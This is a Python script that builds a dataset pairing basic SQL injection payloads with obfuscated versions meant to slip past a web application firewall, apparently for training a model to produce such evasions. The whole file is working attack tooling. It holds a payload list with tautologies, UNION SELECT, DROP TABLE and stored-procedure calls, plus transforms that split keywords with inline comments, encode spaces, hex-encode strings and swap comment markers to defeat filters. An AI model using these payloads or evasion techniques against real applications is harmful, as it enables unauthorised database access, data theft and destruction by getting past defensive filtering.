import random
import urllib.parse
import re
import binascii

# Basic SQL Injections (The "Language A")
BASE_PAYLOADS = [
    "' OR 1=1 --",
    "' UNION SELECT 1,2,3 --",
    "admin' --",
    "' OR 'a'='a",
    "1; DROP TABLE users",
    "' AND 1=1",
    "admin' #",
    "' OR 1=1",
    "1' OR '1'='1",
    "1'1",
    "1 exec sp_ (or exec xp_)",
    "1 AND 1=1",
    "1' AND 1=(SELECT COUNT(*) FROM tabname); --",
    "1 AND USER_NAME() = 'dbo'",
    "1' AND non_existant_table = '1",
    "' OR username IS NOT NULL OR username = '",
    "1 AND 1=1 AND '%'='"
]

def randomize_obfuscation(sql):
    """
    Apply random WAF bypass techniques to a SQL string.
    Teaches the model: 'UNION' -> 'UN/**/ION', 'SELECT' -> 'SE/**/LECT', etc.
    """
    
    # 1. Random Case - REMOVED (Confuses optimization, useless against .lower())
    # sql = ...
    
    # 2. Keyword Splitting (Targeting specific WAF blocks)
    # The dummy target blocks: union, select, drop, --
    keywords = ['UNION', 'SELECT', 'DROP', 'OR', 'AND', 'TABLE']
    
    for kw in keywords:
        # We need a case-insensitive match for the keyword in the potentially mixed-case sql
        # Simple approach: iterate and replace if found (regex is safer for words boundaries but let's keep it simple)
        if True: # ALWAYS split keywords
             pattern = re.compile(re.escape(kw), re.IGNORECASE)
             match = pattern.search(sql)
             if match:
                 start, end = match.span()
                 word = sql[start:end]
                 # Split it: first 2 chars + /**/ + rest
                 if len(word) > 2:
                     split_word = word[:2] + "/**/" + word[2:]
                     sql = sql[:start] + split_word + sql[end:]
    
    # 3. Space Obfuscation (Expanded)
    if " " in sql:
        # 60% chance to mess with spaces
        if True: # ALWAYS obfuscate spaces
            # Add tabs, newlines, or multiple comments
            choices = ["/**/", "%20", "+", "%09", "%0A", "/**//**/"]
            choice = random.choice(choices)
            # Replace ALL spaces with this choice for consistency, or mix? Let's stay consistent per query for now
            sql = sql.replace(" ", choice)
            
    # 4. Logical Tautology Randomization (1=1 is too suspicious)
    if "1=1" in sql:
        if random.random() < 0.7:
             # Generated random true statements
             a = random.randint(1, 100)
             new_tautology = f"{a}={a}"
             sql = sql.replace("1=1", new_tautology)
             
    # 5. Hex Encoding for Strings (Bypass quotes)
    # Target strings like 'admin' or 'dbo'
    string_pattern = re.compile(r"'(\w+)'")
    match = string_pattern.search(sql)
    if match and random.random() < 0.5:
        target_str = match.group(1)
        # Convert to hex 0x...
        hex_val = "0x" + binascii.hexlify(target_str.encode()).decode()
        # Replace 'admin' with 0x61646d696e
        sql = sql.replace(f"'{target_str}'", hex_val)
             
    # 6. Trailing Comment Variation
    # Don't always depend on --
    # But ONLY if the original ends with --
    if sql.endswith("--"):
        if True:
            # Variate the comment style - remove ANY style that contains "--" because WAF blocks it
            style = random.choice(["#", ";#", " "]) 
            sql = sql[:-2] + style # Remove last 2 chars (--) and add new style

    return sql

def generate_dataset(size=1000):
    """Generates a dataset of (Input, Target) pairs"""
    dataset = []
    for _ in range(size):
        base = random.choice(BASE_PAYLOADS)
        
        # Input: The plain malicious intent
        src = base
        
        # Output: The obfuscated version that bypasses WAF
        tgt = randomize_obfuscation(base)
        
        dataset.append((src, tgt))
    return dataset

if __name__ == "__main__":
    data = generate_dataset(10)
    for b, o in data:
        print(f"SRC: {b}")
        print(f"TRG: {o}")
        print("-" * 20)
